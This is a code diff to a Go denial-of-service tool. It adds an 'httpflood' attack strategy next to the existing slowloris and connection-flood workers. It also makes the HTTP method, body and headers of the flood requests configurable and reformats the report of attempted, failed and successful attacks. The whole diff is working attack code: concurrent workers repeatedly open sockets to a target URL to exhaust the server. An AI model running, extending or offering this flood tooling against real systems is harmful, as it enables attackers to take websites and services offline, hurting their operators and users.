@@ -17,6 +17,9 @@ type Engine struct {
 	url         string
 	concurrency uint
 	attackType  string
+	method      string
+	body        string
+	headers     []string
 
 	lock sync.Mutex
 
@@ -52,6 +55,7 @@ func (ctx *Engine) incInterruptedAttacks() {
 }
 
 func (ctx *Engine) slowlorisStrategy(id uint) {
+	logger.Info("Slowloris worker started")
 attackLoop:
 	for {
 		time.Sleep(time.Duration(10 * time.Millisecond))
@@ -68,7 +72,7 @@ attackLoop:
 			continue
 		}
 
-		req := CreateRequest(ctx.url)
+		req := CreateRequest(ctx.url, ctx.method, ctx.body, ctx.headers)
 		rdr := strings.NewReader(req)
 
 		chunk := make([]byte, SLOWLORIS_CHUNK_SIZE)
@@ -81,7 +85,7 @@ attackLoop:
 			}
 
 			if err != nil {
-				logger.Errorf("Unable o partition request string (%s), continuing...", err)
+				logger.Debugf("Unable o partition request string (%s), continuing...", err)
 				sock.Close()
 				continue attackLoop
 			}
@@ -90,7 +94,7 @@ attackLoop:
 			_, err = sock.Write(chunk[0:chunkSize])
 
 			if err != nil {
-				logger.Errorf("Unable to write socket (%s), continuing...", err)
+				logger.Debugf("Unable to write socket (%s), continuing...", err)
 				ctx.incInterruptedAttacks()
 				sock.Close()
 				continue attackLoop
@@ -105,7 +109,56 @@ attackLoop:
 	}
 }
 
+func (ctx *Engine) httpFloodStrategy(id uint) {
+	logger.Info("Http flood worker started")
+attackLoop:
+	for {
+		time.Sleep(time.Duration(10 * time.Millisecond))
+
+		logger.Debug("W", id, "Attempting to connect")
+
+		ctx.incAttemptedAttacks()
+
+		sock, err := Connect(ctx.url)
+
+		if err != nil {
+			logger.Debug("W", id, "Connect failed:", err)
+			ctx.incFailedAttacks()
+			continue
+		}
+
+		req := []byte(CreateRequest(ctx.url, ctx.method, ctx.body, ctx.headers))
+		for {
+			reqLen := len(req)
+			written, err := sock.Write(req)
+
+			req = req[written:len(req)]
+
+			if written != reqLen {
+				continue
+			}
+
+			if len(req) == 0 {
+				break
+			}
+
+			if err != nil {
+				logger.Debugf("Unable to write socket (%s), continuing...", err)
+				ctx.incInterruptedAttacks()
+				sock.Close()
+				continue attackLoop
+			}
+
+			time.Sleep(time.Duration(SLOWLORIS_CHUNK_DELAY * time.Millisecond))
+		}
+		ctx.incSuccessAttacks()
+
+		sock.Close()
+	}
+}
+
 func (ctx *Engine) connectionFloodStrategy(id uint) {
+	logger.Info("Connection flood worker started")
 	buf := make([]byte, 1)
 	for {
 		time.Sleep(time.Duration(10 * time.Millisecond))
@@ -127,13 +180,12 @@ func (ctx *Engine) connectionFloodStrategy(id uint) {
 		if err != nil {
 			ctx.incInterruptedAttacks()
 		}
-
 		sock.Close()
 	}
 }
 
 func (ctx *Engine) report() {
-	fmt.Printf("%d Report:\n\tWorkers: %d\n\tAttempted attacks: %d\n\tFailed attacks: %d\n\tSuccess attacks: %d\n\tInterrupted attacks: %d\n",
+	fmt.Printf("####################\nReport [%d]:\nWorkers -> %d\nAttempted attacks -> %d\nFailed attacks -> %d\nSuccess attacks -> %d\nInterrupted attacks -> %d\n",
 		time.Now().Unix(),
 		ctx.activeWorkers,
 		ctx.attemptedAttacks,
@@ -143,11 +195,19 @@ func (ctx *Engine) report() {
 	)
 }
 
-func NewEngine(url string, concurrency uint, attackType string) Engine {
+func NewEngine(url string,
+	concurrency uint,
+	attackType string,
+	method string,
+	body string,
+	headers []string) Engine {
 	return Engine{
 		url:           url,
 		concurrency:   concurrency,
 		attackType:    attackType,
+		method:        method,
+		body:          body,
+		headers:       headers,
 		activeWorkers: 0,
 		lock:          sync.Mutex{},
 	}
@@ -161,9 +221,10 @@ func (ctx *Engine) Attack() {
 		switch ctx.attackType {
 		case "connectionflood":
 			go ctx.connectionFloodStrategy(i)
-			break
 		case "slowloris":
 			go ctx.slowlorisStrategy(i)
+		case "httpflood":
+			go ctx.httpFloodStrategy(i)
 		default:
 			logger.Error("No attack type specified")
 			return
